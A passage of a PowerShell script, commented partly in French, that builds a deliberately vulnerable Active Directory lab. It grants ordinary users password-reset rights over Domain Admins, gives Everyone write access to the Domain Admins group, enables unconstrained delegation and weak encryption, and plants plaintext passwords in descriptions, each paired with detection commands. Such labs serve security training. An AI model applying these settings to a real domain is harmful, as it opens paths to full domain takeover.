    foreach ($user in $forceChangePwdUsers) {
        $targetAdmin = $domainAdmins | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $targetAdminUser = Get-ADUser $targetAdmin.SamAccountName
            $acl = Get-Acl "AD:\$($targetAdminUser.DistinguishedName)"

            # User-Force-Change-Password GUID
            $forceChangePwdGuid = [Guid]"00299570-246d-11d0-a768-00aa006e0529"

            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "ExtendedRight",
                "Allow",
                $forceChangePwdGuid
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($targetAdminUser.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_ForceChangePassword"
                User = $user.SamAccountName
                Target = $targetAdmin.SamAccountName
                Severity = "High"
                Description = "ExtendedRight to force password change on Domain Admin"
                Impact = "Can reset Domain Admin password and take over account"
                Detection = "(Get-Acl 'AD:\$($targetAdminUser.DistinguishedName)').Access | Where-Object {`$_.ObjectType -eq '00299570-246d-11d0-a768-00aa006e0529'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_ForceChangePassword"
        } catch {
            Write-Log "Error ACL ForceChangePassword for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # NEW: Everyone/Authenticated Users with Write permissions
    # =========================================================================
    Write-Log "Injection: Everyone with GenericWrite on Domain Admins..." "WARNING"

    try {
        $daGroup = Get-ADGroup "Domain Admins"
        $acl = Get-Acl "AD:\$($daGroup.DistinguishedName)"

        # Add Everyone with GenericWrite
        $everyoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $everyoneSID,
            "GenericWrite",
            "Allow"
        )
        $acl.AddAccessRule($ace)
        Set-Acl "AD:\$($daGroup.DistinguishedName)" $acl

        $aclVulns += @{
            Type = "Everyone_In_ACL"
            Target = "Domain Admins"
            Severity = "Critical"
            Description = "Everyone has GenericWrite on Domain Admins group"
            Impact = "Any authenticated user can modify Domain Admins group properties"
            Detection = "(Get-Acl 'AD:CN=Domain Admins,CN=Users,$($script:Config.DomainDN)').Access | Where-Object {`$_.IdentityReference -match 'Everyone|Authenticated Users' -and `$_.ActiveDirectoryRights -match 'Write|GenericWrite'}"
        }
        Write-Log "  Everyone GenericWrite added to Domain Admins" "WARNING"
    } catch {
        Write-Log "Error Everyone ACL: $_" "ERROR"
    }

    $script:Config.Vulnerabilities += $aclVulns

    Write-Log "ACLs dangereuses injectees: $($aclVulns.Count)" "WARNING"
    return $aclVulns
}

# ============================================================================
# CREATION ORDINATEURS
# ============================================================================

function New-ADComputers {
    param(
        [int]$ComputerCount
    )

    Write-Log "=== Creations $ComputerCount ordinateurs ===" "INFO"

    $computers = @()
    $computerTypes = @("WKS", "SRV", "LAP", "VDI")
    $computerOS = @("Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022")

    # Distribution realiste par type
    $workstationCount = [Math]::Ceiling($ComputerCount * 0.60)  # 60% workstations
    $serverCount = [Math]::Ceiling($ComputerCount * 0.15)       # 15% servers
    $laptopCount = [Math]::Ceiling($ComputerCount * 0.20)       # 20% laptops
    $vdiCount = $ComputerCount - $workstationCount - $serverCount - $laptopCount  # Reste VDI

    $distribution = @(
        @{Type="WKS"; Count=$workstationCount; OS="Windows 10"},
        @{Type="SRV"; Count=$serverCount; OS="Windows Server 2019"},
        @{Type="LAP"; Count=$laptopCount; OS="Windows 11"},
        @{Type="VDI"; Count=$vdiCount; OS="Windows 10"}
    )

    # Obtenir les villes disponibles
    $cities = $script:Cities
    $createdCount = 0

    foreach ($dist in $distribution) {
        for ($i = 1; $i -le $dist.Count; $i++) {
            $city = $cities | Get-Random
            $compName = "$($dist.Type)-$($city.Name.ToUpper())-$(Get-Random -Minimum 100 -Maximum 9999)"

            # Trouver l'OU correcte (IT dans la ville)
            $compOU = "OU=IT,OU=$($city.Name),OU=$($city.Continent),OU=GlobalCorp,$($script:Config.DomainDN)"

            try {
                # Créer l'ordinateur
                New-ADComputer -Name $compName `
                               -SamAccountName "$compName`$" `
                               -Path $compOU `
                               -Enabled $true `
                               -OperatingSystem $dist.OS `
                               -Description "Auto-generated computer - $($dist.Type)" `
                               -ErrorAction Stop

                $computer = [PSCustomObject]@{
                    Name = $compName
                    Type = $dist.Type
                    City = $city.Name
                    OU = $compOU
                    OS = $dist.OS
                    Vulnerable = $false
                    VulnTypes = @()
                }

                $computers += $computer
                $createdCount++

                if ($createdCount % 100 -eq 0) {
                    Write-Log "  Created $createdCount/$ComputerCount computers..." "INFO"
                }

            } catch {
                Write-Log "Error creating computer $compName : $_" "ERROR"
            }
        }
    }

    Write-Log "Computers created: $createdCount" "SUCCESS"
    $script:AllComputers = $computers
    return $computers
}

# ============================================================================
# INJECTION VULNERABILITES ORDINATEURS
# ============================================================================

function Add-ComputerVulnerabilities {
    param(
        [array]$Computers
    )

    Write-Log "=== Injection vulnerabilites ordinateurs (20 types) ===" "WARNING"

    $vulnCount = [Math]::Ceiling($Computers.Count * ($script:VulnComputerPercent / 100.0))
    Write-Log "Ordinateurs vulnerables: $vulnCount sur $($Computers.Count) ($($script:VulnComputerPercent)%)" "WARNING"

    $vulnCandidates = $Computers | Get-Random -Count $vulnCount
    $vulnerabilities = @()

    foreach ($comp in $vulnCandidates) {
        # 1. Unconstrained Delegation (10%)
        if ((Get-Random -Maximum 100) -lt 10) {
            try {
                Set-ADComputer -Identity $comp.Name -TrustedForDelegation $true
                $vulnerabilities += @{
                    Type = "Computer_Unconstrained_Delegation"
                    Computer = $comp.Name
                    Severity = "Critical"
                    Description = "Ordinateur avec delegation non contrainte - PrinterBug/PetitPotam attack"
                    Detection = "Get-ADComputer -Filter {TrustedForDelegation -eq `$true}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Unconstrained_Delegation"
            } catch {}
        }

        # 2. Obsolete Operating Systems - Split into 4 specific vulnerabilities
        $osRoll = Get-Random -Maximum 100

        # 2a. Windows XP (5% - Critical)
        if ($osRoll -lt 5) {
            try {
                Set-ADComputer -Identity $comp.Name -OperatingSystem "Windows XP Professional" -OperatingSystemVersion "5.1 (2600)" -OperatingSystemServicePack "Service Pack 3"
                $vulnerabilities += @{
                    Type = "COMPUTER_OS_OBSOLETE_XP"
                    Computer = $comp.Name
                    OS = "Windows XP Professional SP3"
                    Severity = "Critical"
                    Description = "Windows XP detected - obsolete OS (EoL 2014) with known critical vulnerabilities"
                    Impact = "Multiple critical CVEs, no security updates since 2014, vulnerable to MS08-067, MS17-010 (EternalBlue)"
                    Detection = "Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {`$_.OperatingSystem -match 'Windows XP'}"
                    Remediation = "Decommission immediately or isolate from network"
                    CVSS = "10.0"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "OS_XP"
            } catch {}
        }
        # 2b. Windows Server 2003 (5% - Critical)
        elseif ($osRoll -lt 10) {
            try {
                Set-ADComputer -Identity $comp.Name -OperatingSystem "Windows Server 2003" -OperatingSystemVersion "5.2 (3790)" -OperatingSystemServicePack "Service Pack 2"
                $vulnerabilities += @{
                    Type = "COMPUTER_OS_OBSOLETE_2003"
                    Computer = $comp.Name
                    OS = "Windows Server 2003 SP2"
                    Severity = "Critical"
                    Description = "Windows Server 2003 detected - obsolete OS (EoL 2015) with critical vulnerabilities"
                    Impact = "No security updates since 2015, vulnerable to MS08-067, MS17-010, privilege escalation attacks"
                    Detection = "Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {`$_.OperatingSystem -match 'Server 2003'}"
                    Remediation = "Migrate to supported OS (Windows Server 2016+) immediately"
                    CVSS = "10.0"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "OS_2003"
            } catch {}
        }
        # 2c. Windows Server 2008 (5% - High)
        elseif ($osRoll -lt 15) {
            try {
                $os2008Variants = @(
                    @{Name="Windows Server 2008 Standard"; Version="6.0 (6001)"; SP="Service Pack 1"},
                    @{Name="Windows Server 2008 R2 Standard"; Version="6.1 (7601)"; SP="Service Pack 1"}
                )
                $variant = $os2008Variants | Get-Random
                Set-ADComputer -Identity $comp.Name -OperatingSystem $variant.Name -OperatingSystemVersion $variant.Version -OperatingSystemServicePack $variant.SP
                $vulnerabilities += @{
                    Type = "COMPUTER_OS_OBSOLETE_2008"
                    Computer = $comp.Name
                    OS = "$($variant.Name) $($variant.SP)"
                    Severity = "High"
                    Description = "Windows Server 2008/2008 R2 detected - obsolete OS (EoL 2020) with unpatched vulnerabilities"
                    Impact = "End of support since January 2020, no security updates, vulnerable to BlueKeep (CVE-2019-0708) if unpatched"
                    Detection = "Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {`$_.OperatingSystem -match 'Server 2008'}"
                    Remediation = "Upgrade to Windows Server 2019/2022 or migrate workloads"
                    CVE = "CVE-2019-0708 (BlueKeep)"
                    CVSS = "7.5"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "OS_2008"
            } catch {}
        }
        # 2d. Windows Vista (5% - High)
        elseif ($osRoll -lt 20) {
            try {
                Set-ADComputer -Identity $comp.Name -OperatingSystem "Windows Vista Business" -OperatingSystemVersion "6.0 (6002)" -OperatingSystemServicePack "Service Pack 2"
                $vulnerabilities += @{
                    Type = "COMPUTER_OS_OBSOLETE_VISTA"
                    Computer = $comp.Name
                    OS = "Windows Vista Business SP2"
                    Severity = "High"
                    Description = "Windows Vista detected - obsolete OS (EoL 2017) with known vulnerabilities"
                    Impact = "End of support since April 2017, no security updates, vulnerable to privilege escalation and remote code execution"
                    Detection = "Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {`$_.OperatingSystem -match 'Vista'}"
                    Remediation = "Upgrade to Windows 10/11 immediately"
                    CVSS = "7.8"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "OS_Vista"
            } catch {}
        }

        # 3. Pre-Created Computer Account (15%)
        if ((Get-Random -Maximum 100) -lt 15) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "Pre-created computer account - joinable by any user"
                $vulnerabilities += @{
                    Type = "Computer_Pre_Created"
                    Computer = $comp.Name
                    Severity = "Medium"
                    Description = "Compte ordinateur pre-cree - rejoinable par n'importe quel utilisateur"
                    Detection = "Get-ADComputer -Filter * -Properties Description | Where-Object {`$_.Description -match 'pre-created|joinable'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Pre_Created"
            } catch {}
        }

        # 4. Weak LAPS Password (5%)
        if ((Get-Random -Maximum 100) -lt 5) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "LAPS: Weak password complexity"
                $vulnerabilities += @{
                    Type = "Computer_Weak_LAPS"
                    Computer = $comp.Name
                    Severity = "Medium"
                    Description = "Mot de passe LAPS potentiellement faible"
                    Detection = "Check LAPS password complexity settings"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Weak_LAPS"
            } catch {}
        }

        # 5. Constrained Delegation (8%)
        if ((Get-Random -Maximum 100) -lt 8) {
            try {
                Set-ADAccountControl -Identity $comp.Name -TrustedToAuthForDelegation $true
                $delegationTargets = @("CIFS/fileserver.aza-me.cc", "HTTP/webserver.aza-me.cc")
                Set-ADComputer -Identity $comp.Name -Add @{'msDS-AllowedToDelegateTo'=$delegationTargets} -ErrorAction SilentlyContinue
                $vulnerabilities += @{
                    Type = "Computer_Constrained_Delegation"
                    Computer = $comp.Name
                    Severity = "Critical"
                    Description = "Ordinateur avec delegation contrainte - peut impersonner users"
                    Detection = "Get-ADComputer -Filter * -Properties 'msDS-AllowedToDelegateTo' | Where-Object {`$_.'msDS-AllowedToDelegateTo'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Constrained_Delegation"
            } catch {}
        }

        # 6. RBCD on Computers (5%)
        if ((Get-Random -Maximum 100) -lt 5) {
            try {
                # Marquer pour RBCD (ACL sera ajouté si besoin)
                $vulnerabilities += @{
                    Type = "Computer_RBCD"
                    Computer = $comp.Name
                    Severity = "High"
                    Description = "Ordinateur vulnerable a Resource-Based Constrained Delegation"
                    Detection = "Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' | Where-Object {`$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "RBCD"
            } catch {}
        }

        # 7. Computer in Admin Groups (2%)
        if ((Get-Random -Maximum 100) -lt 2) {
            try {
                Add-ADGroupMember "Domain Admins" -Members "$($comp.Name)$" -ErrorAction SilentlyContinue
                $vulnerabilities += @{
                    Type = "Computer_In_Admin_Group"
                    Computer = $comp.Name
                    Group = "Domain Admins"
                    Severity = "Critical"
                    Description = "Compte machine dans Domain Admins - privilege escalation"
                    Detection = "Get-ADGroupMember 'Domain Admins' | Where-Object {`$_.objectClass -eq 'computer'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Admin_Group"
            } catch {}
        }

        # 8. Computer with DCSync Rights (1%)
        if ((Get-Random -Maximum 100) -lt 1) {
            try {
                # Marquer pour DCSync rights (sera ajouté dans ACL section)
                $vulnerabilities += @{
                    Type = "Computer_DCSync_Rights"
                    Computer = $comp.Name
                    Severity = "Critical"
                    Description = "Ordinateur avec droits de replication DC - peut extraire tous les hashes"
                    Detection = "Check replication rights on domain root"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "DCSync"
            } catch {}
        }

        # 9. Stale/Inactive Computer (25%)
        if ((Get-Random -Maximum 100) -lt 25) {
            try {
                $inactiveDate = (Get-Date).AddDays(-120)
                Set-ADComputer -Identity $comp.Name -Description "Last seen: $($inactiveDate.ToString('yyyy-MM-dd')) - INACTIVE"
                $vulnerabilities += @{
                    Type = "Computer_Stale_Inactive"
                    Computer = $comp.Name
                    LastSeen = $inactiveDate
                    Severity = "Medium"
                    Description = "Ordinateur inactif depuis 120+ jours - potentiel zombie account"
                    Detection = "Get-ADComputer -Filter * -Properties LastLogonDate | Where-Object {`$_.LastLogonDate -lt (Get-Date).AddDays(-90)}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Stale"
            } catch {}
        }

        # 10. Computer Password Never Changed (15%)
        if ((Get-Random -Maximum 100) -lt 15) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "Machine password > 90 days old"
                $vulnerabilities += @{
                    Type = "Computer_Old_Password"
                    Computer = $comp.Name
                    Severity = "High"
                    Description = "Mot de passe machine non change depuis 90+ jours"
                    Detection = "Get-ADComputer -Filter * -Properties PasswordLastSet | Where-Object {`$_.PasswordLastSet -lt (Get-Date).AddDays(-90)}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Old_Password"
            } catch {}
        }

        # 11. Computer with SPNs (10%)
        if ((Get-Random -Maximum 100) -lt 10) {
            try {
                $spns = @("HTTP/$($comp.Name).aza-me.cc", "MSSQL/$($comp.Name).aza-me.cc:1433")
                Set-ADComputer -Identity $comp.Name -ServicePrincipalNames @{Add=$spns}
                $vulnerabilities += @{
                    Type = "Computer_With_SPNs"
                    Computer = $comp.Name
                    SPNs = $spns -join ", "
                    Severity = "Medium"
                    Description = "Ordinateur avec SPNs - potentiellement Kerberoastable"
                    Detection = "Get-ADComputer -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "SPNs"
            } catch {}
        }

        # 12. No LAPS Deployed (30%)
        if ((Get-Random -Maximum 100) -lt 30) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "No LAPS - local admin password not managed"
                $vulnerabilities += @{
                    Type = "Computer_No_LAPS"
                    Computer = $comp.Name
                    Severity = "Medium"
                    Description = "LAPS non deploye - mot de passe admin local non gere"
                    Detection = "Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object {-not `$_.'ms-Mcs-AdmPwd'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "No_LAPS"
            } catch {}
        }

        # 13. Computer ACL Abuse - GenericAll (3%)
        if ((Get-Random -Maximum 100) -lt 3) {
            try {
                # Marquer pour ACL abuse
                $vulnerabilities += @{
                    Type = "Computer_ACL_GenericAll"
                    Computer = $comp.Name
                    Severity = "High"
                    Description = "Permissions dangereuses sur objet ordinateur - GenericAll/WriteDACL"
                    Detection = "Get-ADComputer | ForEach-Object {(Get-Acl `"AD:\`$(`$_.DistinguishedName)`").Access}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "ACL_Abuse"
            } catch {}
        }

        # 14. Disabled Computer Not Deleted (12%)
        if ((Get-Random -Maximum 100) -lt 12) {
            try {
                Set-ADComputer -Identity $comp.Name -Enabled $false
                Set-ADComputer -Identity $comp.Name -Description "DISABLED - but not deleted from AD"
                $vulnerabilities += @{
                    Type = "Computer_Disabled_Not_Deleted"
                    Computer = $comp.Name
                    Severity = "Low"
                    Description = "Ordinateur desactive mais non supprime - pollution AD"
                    Detection = "Get-ADComputer -Filter {Enabled -eq `$false}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Disabled"
            } catch {}
        }

        # 15. Computer in Wrong OU (8%)
        if ((Get-Random -Maximum 100) -lt 8) {
            try {
                $vulnerabilities += @{
                    Type = "Computer_Wrong_OU"
                    Computer = $comp.Name
                    CurrentOU = $comp.OU
                    Severity = "Medium"
                    Description = "Ordinateur dans OU avec politiques de securite faibles"
                    Detection = "Check computer OU placement vs GPO assignments"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Wrong_OU"
            } catch {}
        }

        # 16. Weak Encryption Types (10%)
        if ((Get-Random -Maximum 100) -lt 10) {
            try {
                # DES_CBC_MD5 + RC4_HMAC only (0x03)
                Set-ADComputer -Identity $comp.Name -Replace @{'msDS-SupportedEncryptionTypes'=3}
                $vulnerabilities += @{
                    Type = "Computer_Weak_Encryption"
                    Computer = $comp.Name
                    EncryptionTypes = "DES/RC4 only"
                    Severity = "Medium"
                    Description = "Support uniquement des types de chiffrement faibles (DES/RC4)"
                    Detection = "Get-ADComputer -Filter * -Properties 'msDS-SupportedEncryptionTypes' | Where-Object {`$_.'msDS-SupportedEncryptionTypes' -band 0x03}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Weak_Encryption"
            } catch {}
        }

        # 17. Computer Description with Sensitive Data (5%)
        if ((Get-Random -Maximum 100) -lt 5) {
            try {
                $sensitiveInfo = @("LocalAdmin: P@ssw0rd123", "Password: Welcome2024!", "Admin: Changeme123", "Credentials: admin/password")
                $leak = $sensitiveInfo | Get-Random
                Set-ADComputer -Identity $comp.Name -Description $leak
                $vulnerabilities += @{
                    Type = "Computer_Sensitive_Description"
                    Computer = $comp.Name
                    LeakedInfo = $leak
                    Severity = "High"
                    Description = "Informations sensibles dans Description de l'ordinateur"
                    Detection = "Get-ADComputer -Filter * -Properties Description | Where-Object {`$_.Description -match 'password|pwd|admin|credential'}"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Sensitive_Description"
            } catch {}
        }

        # 18. Pre-Windows 2000 Computer (4%)
        if ((Get-Random -Maximum 100) -lt 4) {
            try {
                # Simuler compte avec droits legacy
                $vulnerabilities += @{
                    Type = "Computer_Pre_Win2000"
                    Computer = $comp.Name
                    Severity = "Medium"
                    Description = "Compte ordinateur cree avec droits Pre-Windows 2000 - faibles permissions"
                    Detection = "Check Pre-Windows 2000 Compatible Access group membership"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Pre_Win2000"
            } catch {}
        }

        # 19. Computer with Local Admin Mapping (6%)
        if ((Get-Random -Maximum 100) -lt 6) {
            try {
                $vulnerabilities += @{
                    Type = "Computer_Local_Admin_Mapping"
                    Computer = $comp.Name
                    Severity = "Low"
                    Description = "Ordinateur sans protection AdminSDHolder - mapping admin local vulnerable"
                    Detection = "Check adminCount attribute and ACL inheritance"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Local_Admin_Mapping"
            } catch {}
        }

        # 20. SMB Signing Disabled (18%)
        if ((Get-Random -Maximum 100) -lt 18) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "SMB Signing: Disabled - NTLM relay vulnerable"
                $vulnerabilities += @{
                    Type = "Computer_SMB_Signing_Disabled"
                    Computer = $comp.Name
                    Severity = "High"
                    Description = "SMB Signing desactive - vulnerable aux attaques NTLM relay"
                    Detection = "Check registry: HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\RequireSecuritySignature"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "SMB_Signing_Disabled"
            } catch {}
        }

        # 21. Computer Never Logged On (7%)
        if ((Get-Random -Maximum 100) -lt 7) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "Never logged on - orphaned account"
                $vulnerabilities += @{
                    Type = "COMPUTER_NEVER_LOGGED_ON"
                    Computer = $comp.Name
                    Severity = "Medium"
                    Description = "Ordinateur jamais connecte - compte orphelin ou pre-created"
                    Impact = "Indicates poor AD hygiene or potential attack prep"
                    Detection = "Get-ADComputer -Filter * -Properties LastLogonDate | Where-Object {-not `$_.LastLogonDate}"
                    Remediation = "Investigate and delete if not needed"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Never_Logged_On"
            } catch {}
        }

        # 22. No BitLocker Encryption (25%)
        if ((Get-Random -Maximum 100) -lt 25) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "No BitLocker - unencrypted disk"
                $vulnerabilities += @{
                    Type = "COMPUTER_NO_BITLOCKER"
                    Computer = $comp.Name
                    Severity = "High"
                    Description = "Ordinateur sans chiffrement BitLocker - vol de donnees physique"
                    Impact = "Physical theft or lost device = full data exposure"
                    Detection = "Check BitLocker status via WMI or MBAM/Intune"
                    Remediation = "Deploy BitLocker via GPO"
                    Compliance = "ANSSI, NIST 800-53, PCI-DSS, HIPAA"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "No_BitLocker"
            } catch {}
        }

        # 23. SMBv1 Enabled (Legacy Protocol) (15%)
        if ((Get-Random -Maximum 100) -lt 15) {
            try {
                Set-ADComputer -Identity $comp.Name -Description "SMBv1 enabled - vulnerable to EternalBlue/WannaCry"
                $vulnerabilities += @{
                    Type = "COMPUTER_LEGACY_PROTOCOL_SMBV1"
                    Computer = $comp.Name
                    Severity = "Critical"
                    Description = "SMBv1 active - vulnerable aux exploits MS17-010 (EternalBlue)"
                    Impact = "Remote code execution, ransomware propagation (WannaCry, NotPetya)"
                    Detection = "Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol; Check registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\SMB1"
                    Remediation = "Disable SMBv1: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"
                    CVE = "MS17-010 (CVE-2017-0144)"
                    CVSS = "9.3"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "SMBv1_Enabled"
            } catch {}
        }

        # 24. Duplicate SPN (3%)
        if ((Get-Random -Maximum 100) -lt 3) {
            try {
                # Simuler un SPN duplique
                $duplicateSPN = "HTTP/duplicated.aza-me.cc"
                Set-ADComputer -Identity $comp.Name -ServicePrincipalNames @{Add=$duplicateSPN} -ErrorAction SilentlyContinue
                $vulnerabilities += @{
                    Type = "COMPUTER_DUPLICATE_SPN"
                    Computer = $comp.Name
                    SPN = $duplicateSPN
                    Severity = "Medium"
                    Description = "SPN duplique sur plusieurs objets - Kerberos authentication failure"
                    Impact = "Service authentication failures, Kerberos errors"
                    Detection = "setspn -X; Check for duplicate SPNs across AD"
                    Remediation = "Remove duplicate SPN: setspn -D SPN computername"
                }
                $comp.Vulnerable = $true
                $comp.VulnTypes += "Duplicate_SPN"
            } catch {}
        }
    }

    Write-Log "Vulnerabilites ordinateurs injectees: $($vulnerabilities.Count) (24+ types disponibles)" "WARNING"
    $script:Config.Vulnerabilities += $vulnerabilities
    return $vulnerabilities
}

# ============================================================================
# GeneratingS RAPPORTS
# ============================================================================

function Export-Reports {
    param(
        [string]$OutputPath
    )

    Write-Log "=== Generatings rapports ===" "INFO"

    # Creer le dossier de sortie
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

    # =========================================================================
    # RAPPORT CSV - Tous les users
    # =========================================================================
    $csvPath = Join-Path $OutputPath "GlobalCorp_Users_$timestamp.csv"

    $csvData = $script:AllUsers | ForEach-Object {
        [PSCustomObject]@{
            SamAccountName = $_.SamAccountName
            DisplayName = $_.DisplayName
            UPN = $_.UPN
            Department = $_.Department
            City = $_.City
            Role = $_.Role
            EmployeeID = $_.EmployeeID
            EmployeeType = $_.EmployeeType
            IsManager = $_.IsManager
            IsTeamLead = $_.IsTeamLead
            IsExecutive = $_.IsExecutive
            Vulnerable = $_.Vulnerable
            VulnerabilityTypes = ($_.VulnType -join "; ")
        }
    }

    $csvData | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
    Write-Log "CSV exporte: $csvPath" "SuccessS"

    # =========================================================================
    # RAPPORT HTML
    # =========================================================================
    $htmlPath = Join-Path $OutputPath "GlobalCorp_Report_$timestamp.html"

    # Statistiques
    $totalUsers = $script:AllUsers.Count
    $vulnUsers = ($script:AllUsers | Where-Object { $_.Vulnerable }).Count
    $totalOUs = $script:Config.CreatedOUs.Count
    $totalGroups = $script:Config.CreatedGroups.Count
    $totalVulns = $script:Config.Vulnerabilities.Count

    $vulnByType = $script:Config.Vulnerabilities | Group-Object Type | Sort-Object Count -Descending
    $vulnBySeverity = $script:Config.Vulnerabilities | Group-Object Severity | Sort-Object Count -Descending
    $usersByCity = $script:AllUsers | Group-Object City | Sort-Object Count -Descending
    $usersByDept = $script:AllUsers | Group-Object Department | Sort-Object Count -Descending

    $html = @"
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GlobalCorp AD Population Report</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; line-height: 1.6; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        h1 { font-size: 2.5em; margin-bottom: 10px; }
        h2 { color: #667eea; margin: 20px 0 15px; padding-bottom: 10px; border-bottom: 2px solid #667eea; }
        h3 { color: #a0a0ff; margin: 15px 0 10px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #16213e; padding: 20px; border-radius: 10px; text-align: center; border-left: 4px solid #667eea; }
        .stat-card.warning { border-left-color: #f39c12; }
        .stat-card.danger { border-left-color: #e74c3c; }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-card.warning .stat-number { color: #f39c12; }
        .stat-card.danger .stat-number { color: #e74c3c; }
        .stat-label { color: #888; font-size: 0.9em; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; background: #16213e; border-radius: 10px; overflow: hidden; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #2a2a4a; }
        th { background: #0f3460; color: #667eea; font-weight: 600; }
        tr:hover { background: #1f4068; }
        .severity-critical { color: #e74c3c; font-weight: bold; }
        .severity-high { color: #f39c12; font-weight: bold; }
        .severity-medium { color: #f1c40f; }
        .severity-low { color: #3498db; }
        .chart-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; margin: 20px 0; }
        .chart { background: #16213e; padding: 20px; border-radius: 10px; }
        .bar { height: 25px; background: linear-gradient(90deg, #667eea, #764ba2); border-radius: 5px; margin: 5px 0; transition: width 0.5s; }
        .bar-label { display: flex; justify-content: space-between; font-size: 0.9em; margin-top: 5px; }
        .hidden { display: none; }
        .toggle-btn { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px 0; }
        .toggle-btn:hover { background: #c0392b; }
        .vuln-list { max-height: 400px; overflow-y: auto; }
        .detection-cmd { background: #0a0a1a; padding: 10px; border-radius: 5px; font-family: 'Consolas', monospace; font-size: 0.85em; margin: 5px 0; overflow-x: auto; }
        footer { text-align: center; padding: 20px; color: #666; margin-top: 30px; }
        .warning-banner { background: #c0392b; padding: 15px; border-radius: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🏢 GlobalCorp AD Population Report</h1>
            <p>Rapport de peuplement Active Directory - Environnement de Lab Securite</p>
            <p>Genere le: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")</p>
            <p>Domaine: $($script:Config.Domain)</p>
        </header>

        <div class="warning-banner">
            ⚠️ <strong>ATTENTION:</strong> Cet environnement contient des vulnerabilites INTENTIONNELLES a des fins d'audit de securite. Ne pas utiliser en production!
        </div>

        <h2>📊 Vue d'ensemble</h2>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">$totalUsers</div>
                <div class="stat-label">users crees</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$totalOUs</div>
                <div class="stat-label">Unites d'Organisation</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$totalGroups</div>
                <div class="stat-label">groups crees</div>
            </div>
            <div class="stat-card warning">
                <div class="stat-number">$vulnUsers</div>
                <div class="stat-label">users vulnerables</div>
            </div>
            <div class="stat-card danger">
                <div class="stat-number">$totalVulns</div>
                <div class="stat-label">Vulnerabilites injectees</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$($script:Cities.Count)</div>
